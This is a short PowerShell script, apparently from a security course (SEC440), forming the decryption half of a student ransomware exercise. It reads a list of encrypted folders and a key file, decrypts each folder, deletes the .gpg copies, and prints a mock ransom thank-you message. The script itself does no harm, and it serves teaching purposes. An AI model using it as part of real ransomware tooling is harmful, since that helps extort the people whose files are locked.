# SEC440 - Bronson & Charlie Decrypt Function
# Requisite Files for Decrypt:
#  - encryptedFolders.txt
#  - secretkeytodecrypt.txt
# Retrieve list of encrypted files from encryptedFolders.txt

#Fetch all of the encrypted folder paths from the exported list
$decryptList = Get-Content -Path encryptedFolders.txt
echo $decryptList
#retrieve the symmetric key used to encrypt the files and store it in variable
$SecurePassword = Get-Content -Path secretkeytodecrypt.txt

#Create a for loop to decrypt files by folder path
ForEach ($path in $decryptList)
{
    # decrypt all files/folders under target users directory 
    try {
    Remove-Encryption -FolderPath $path -Password $SecurePassword
    }
    catch {"Tried Decrypting Empty Directory Path. Moving on."}
    # remove all of the .gpg encrypted files after decryption
    $path = $path.replace(' ','')
    $allGPGPath = "$path\*.gpg"
    try{Remove-Item -Path $allGPGPath}
    catch{echo "Deleting the GPG versions failed."}
}

# Send a thank you message, after all we did just get paid. 
echo "Thank you for your payment, your files have been decrypted, next time be ready :)"